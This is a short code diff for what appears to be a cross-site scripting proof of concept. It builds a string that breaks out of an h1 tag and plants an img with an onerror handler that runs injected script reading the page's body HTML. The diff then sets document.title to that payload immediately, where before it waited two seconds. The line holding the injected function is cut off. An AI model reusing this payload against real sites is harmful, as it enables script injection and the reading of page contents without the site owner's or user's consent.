@@ -2,6 +2,4 @@ func_str="console.log('inject');body_text = document.body.innerHTML;start_idx = 
 
 title_str = "</h1><img src='not_exist.jpg' onerror=\"" + func_str + "\"></img><h1>";
 
-setTimeout(function(){
-    document.title = title_str;
-}, 2000);
+document.title = title_str;
